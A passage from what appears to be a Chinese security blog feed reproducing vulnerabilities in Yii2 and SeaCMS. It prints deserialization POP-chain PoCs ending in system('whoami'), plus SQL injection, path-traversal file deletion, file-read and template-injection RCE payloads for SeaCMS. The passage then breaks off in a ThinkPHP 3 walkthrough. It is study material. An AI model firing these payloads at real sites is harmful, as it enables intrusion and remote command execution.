class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//vendor/codeception/codeception/ext/RunProcess.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $processes = [];<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;stopProcess();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopProcess</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (array_reverse(<span class="hljs-keyword">$this</span>-&gt;processes) <span class="hljs-keyword">as</span> $process) &#123;<br>            <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> $process Process  **/</span><br>            <span class="hljs-keyword">if</span> (!$process-&gt;isRunning()) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;output-&gt;debug(<span class="hljs-string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());<br>            $process-&gt;stop();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;processes = [];<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">private</span> $processes;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> $id;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>;<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 这里也可以借助 CheckAction 的 Run 方法来执行</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028111936675.png" alt="image-20211028111936675"></p><blockquote><p>主要还是利用之前的链子稍微修改了一下</p></blockquote><h3 id="POP-4"><a href="#POP-4" class="headerlink" title="POP 4"></a>POP 4</h3><p>这里找到了另外一个析构函数</p><p> 这里采用的是利用<code>__toString()</code>魔术方法来构造 pop 链</p><p>找到这个析构函数，然后跟进 <code>clearAll()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028114146219.png" alt="image-20211028114146219"></p><p>可以发现<code>clearAll()</code>函数调用了<code>clearKey()</code>，在<code>clearKey()</code>中执行了字符串拼接的操作，所以可以利用这一点来调用<code>__toString()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028114122258.png" alt="image-20211028114122258"></p><p>调用<code>__toString()</code>时控制参数调用<code>render()</code>，然后使用<code>__call()</code>魔术方法完成 POP 链的构造，之后的就可以利用之前的 部分 POP 链了</p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028124226068.png" alt="image-20211028124226068"></p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">Deprecated</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $key = [];<br>        <span class="hljs-keyword">private</span> $path;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> Deprecated();<br>            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;hello&#x27;</span> =&gt; <span class="hljs-string">&#x27;world&#x27;</span><br>            );<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deprecated</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $description;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span>()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028133701106.png" alt="image-20211028133701106"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于反序列化链的挖掘需要先找到入口点比如<code>__destruct()</code> 和 <code>__wakeup()</code>，然后再逐步往后推找到一条完整的链，最终构造一条完整的利用链。看着容易自己找的话还是很有难度的。</p><p>参考文章</p><p><a href="https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://jelly0930.github.io/2021/09/yii2/">https://jelly0930.github.io/2021/09/yii2/</a></p><p><a href="https://v0w.top/2020/09/22/Yii2unserialize/">https://v0w.top/2020/09/22/Yii2unserialize/</a></p><p><a href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;yii2-反序列化漏洞&quot;&gt;&lt;a href=&quot;#yii2-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;yii2 反序列化漏洞&quot;&gt;&lt;/a&gt;yii2 反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SeaCMS 代码审计</title>
    <link href="http://example.com/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-10-27T03:42:38.000Z</published>
    <updated>2021-10-27T03:43:15.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SeaCMS-代码审计"><a href="#SeaCMS-代码审计" class="headerlink" title="SeaCMS 代码审计"></a>SeaCMS 代码审计</h1><h2 id="网站环境搭建"><a href="#网站环境搭建" class="headerlink" title="网站环境搭建"></a>网站环境搭建</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211024131021167.png" alt="image-20211024131021167"></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><h3 id="前端入口-index-php"><a href="#前端入口-index-php" class="headerlink" title="前端入口 index.php"></a>前端入口 <code>index.php</code></h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025231649167.png" alt="image-20211025231649167"></p><blockquote><p>吐槽一下是不是我下载到盗版的源码了怎么改的代码直接注释而不是删除啊</p></blockquote><p>使用 <code>echoIndex()</code> 函数来完成页面打印的操作</p><p>在 <code>include/common.php</code> 中定义了一些初始化操作和安全过滤方法，还包含了一些有安全过滤功能的文件等</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025232148895.png" alt="image-20211025232148895"></p><h3 id="后端入口-admin-index-php"><a href="#后端入口-admin-index-php" class="headerlink" title="后端入口 admin/index.php"></a>后端入口 <code>admin/index.php</code></h3><p>后端入口文件的内容比较少，主要靠包含其他文件实现功能</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025233957441.png" alt="image-20211025233957441"></p><p><code>admin/config.php</code> 中有检测用户是否登录的功能还有一堆其他获取信息的函数</p><p><code>admin/templets</code> 中存储的是后端页面模板</p><blockquote><p>源码就总体简单看了一下，不是特别熟练看了也没有谱，还得多练习</p></blockquote><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h4><p>payload:<code>/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=extractvalue(1,concat_ws(0x7e,user(),database()))</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025000812531.png" alt="image-20211025000812531"></p><p>漏洞产生的点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026002329021.png" alt="image-20211026002329021"></p><p>这里的 <code>$type</code> 和 <code>$ids</code> 都没有利用单引号包裹</p><p><code>$type</code> 利用之前的 <code>is_numeric()</code> 函数检测了类型，所以不能使用字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026112501752.png" alt="image-20211026112501752"></p><p>搜先是执行到一个 <code>if</code> 语句判断 <code>$page</code> 是否大于2,如果大于二就跳过执行后面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113502092.png" alt="image-20211026113502092"></p><p>我们需要执行到 <code>ReadData()</code> 函数，在该函数中需要 <code>$id &gt; 0</code> 才可以执行到 <code>ReadrList()</code> 函数中，并且 <code>$x</code> 为 <code>implode(&#39;,&#39; , $rlist)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113912958.png" alt="image-20211026113912958"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113613051.png" alt="image-20211026113613051"></p><p>满足上面的条件后就可以使用 <code>Readrlist()</code> 函数，这里的 <code>$ids</code> 就是 <code>$x</code> 的值，所以我们可以控制 <code>$rlist</code> 的值来实现控制 <code>$ids</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026114030690.png" alt="image-20211026114030690"></p><p>总结一下要执行到漏洞语句这里需要的条件</p><ol><li><code>$page &gt; 2</code></li><li><code>$id &gt; 0</code> 也就是 <code>$gid</code></li><li><code>$rlist</code> 为数组</li></ol><p>构造的语句的时候还需要注意绕过过滤，一下是过滤文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026121200334.png" alt="image-20211026121200334"></p><p>绕过里面包含了一些常见的 XSS SQL 等</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>发现一个类似于目录遍历的点，但是直接利用不行，所以查看一下源码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026132733737.png" alt="image-20211026132733737"></p><p>源码很容易绕过，保证0到11的字母是 <code>../templets/</code> 即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133031797.png" alt="image-20211026133031797"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133128656.png" alt="image-20211026133128656"></p><p>可以执行任意文件删除了</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在<code>admin/templets/admin_collect_ruleadd2.htm</code>中有文件读取的操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140130062.png" alt="image-20211026140130062"></p><p>读取的目标是 <code>$siteurl</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140829070.png" alt="image-20211026140829070"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140852762.png" alt="image-20211026140852762"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/admin_collect_news.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: 192.168.148.172<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span>: http://192.168.148.172/admin/<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=fm1vheb6hm439qqhktpbpecro3<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span>: 72<br><br>action=addrule&amp;step=2&amp;itemname=1&amp;siteurl=file://C:/test/1.txt&amp;showcode=1<br></code></pre></td></tr></table></figure><p>GET POST 都可以</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// payload1</span><br>http:<span class="hljs-comment">//ip/search.php</span><br>POST: searchtype=<span class="hljs-number">5</span>&amp;order=&#125;&#123;end <span class="hljs-keyword">if</span>&#125; &#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)phpinfo();<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&#125;&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026231934858.png" alt="image-20211026231934858"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// payload2<br><br>POST:<br>searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$<span class="hljs-emphasis">_POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);if(1&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami</span><br><span class="hljs-emphasis">searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$_</span>POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);//&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232316527.png" alt="image-20211026232316527"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232338978.png"></p><p>直接跟着 payload 走一遍</p><p>POST 传入数据后，<code>$searchtype</code> 需要为 5 才能进入这个选择，后面的 <code>$order</code> 会被替换进 <code>$content</code> 中加入后续的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027002348054.png" alt="image-20211027002348054"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027004534871.png" alt="image-20211027004534871"></p><p>这样就可以执行命令了，payload 就是依靠闭合语句实现命令的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027005417801.png" alt="image-20211027005417801"></p><p>主要还是对参数的过滤不到位</p><p>payload 的构造 <code>$order=&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</code></p><p>首先第一个<code>&#125;</code>是为了闭合之前的，然后使用 <code>&#123;if: </code> 这样才能进入 <code>@eval()</code> 这个函数执行，使用 <code>&#123;end if&#125;</code> 就是执行 <code>if</code> 选择使他能够执行到后面的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027010247159.png" alt="image-20211027010247159"></p><p>这个漏洞感觉要直接挖出来还是比较难的，但是原理感觉不是特别难，就是字符串拼接导致命令执行了，希望有一天我也可以挖到 RCE 啊！！！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于代码审计还是需要结合功能点和代码一起审计，这样才效率才会比较，然后再结合所有代码看一遍，这样才能实现漏洞的深度挖掘。</p><p>参考文章</p><p><a href="https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61">https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61</a></p><p><a href="https://jelly0930.github.io/2021/09/seacms/">https://jelly0930.github.io/2021/09/seacms/</a></p><p><a href="https://www.cnblogs.com/ffx1/p/12653597.html">https://www.cnblogs.com/ffx1/p/12653597.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SeaCMS-代码审计&quot;&gt;&lt;a href=&quot;#SeaCMS-代码审计&quot; class=&quot;headerlink&quot; title=&quot;SeaCMS 代码审计&quot;&gt;&lt;/a&gt;SeaCMS 代码审计&lt;/h1&gt;&lt;h2 id=&quot;网站环境搭建&quot;&gt;&lt;a href=&quot;#网站环境搭建&quot; cla</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>TP3代码审计</title>
    <link href="http://example.com/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-10-23T03:28:19.000Z</published>
    <updated>2021-10-23T03:29:35.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-3"><a href="#ThinkPHP-3" class="headerlink" title="ThinkPHP 3"></a>ThinkPHP 3</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 3.2.3</p></blockquote><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">www</span>  <span class="hljs-selector-tag">WEB</span>部署目录（或者子目录）<br>├─<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span>       入口文件<br>├─<span class="hljs-selector-tag">README</span><span class="hljs-selector-class">.md</span>       <span class="hljs-selector-tag">README</span>文件<br>├─<span class="hljs-selector-tag">Application</span>     应用目录<br>├─<span class="hljs-selector-tag">Public</span>          资源文件目录<br>└─<span class="hljs-selector-tag">ThinkPHP</span>        框架目录<br></code></pre></td></tr></table></figure><p>框架目录ThinkPHP的结构</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录 <br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─<span class="hljs-operator"> ...      </span>更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LICENSE</span>.</span></span>txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">README</span>.</span></span>txt   框架README文件<br>│  └─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ThinkPHP</span>.</span></span>php 框架入口文件<br></code></pre></td></tr></table></figure><p>下面是官方建议</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220346848.png" alt="image-20210925220346848"></p><p>试了一下如果默认这么放的话，可以读取到其他文件中的内容，比如日志</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220511043.png" alt="image-20210925220511043"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>ThinkPHP 的默认配置文件定义格式均采用返回 PHP 数组的格式</p><p>配置的加载顺序是：<strong>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</strong></p><p><strong>配置的读取</strong></p><p>C（config）方法，读取已有的配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 